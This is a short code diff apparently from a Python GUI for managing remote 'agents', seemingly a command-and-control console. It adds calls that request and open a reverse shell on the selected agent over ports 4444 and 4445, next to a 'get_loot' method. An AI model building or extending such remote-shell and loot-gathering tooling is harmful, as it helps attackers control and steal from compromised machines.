@@ -169,6 +169,10 @@ class Manager(QtWidgets.QMainWindow, design.Ui_MainWindow):
         if not self.has_selection():
             return
         
+        self.session.req_revsh(self.AgentList.currentItem().text(), 4444)
+        self.session.do_revsh(self.AgentList.currentItem().text(), 4445)
+        #self.AgentList.currentItem().text()
+
         print("Getting reverse shell")
     
     def get_loot(self):
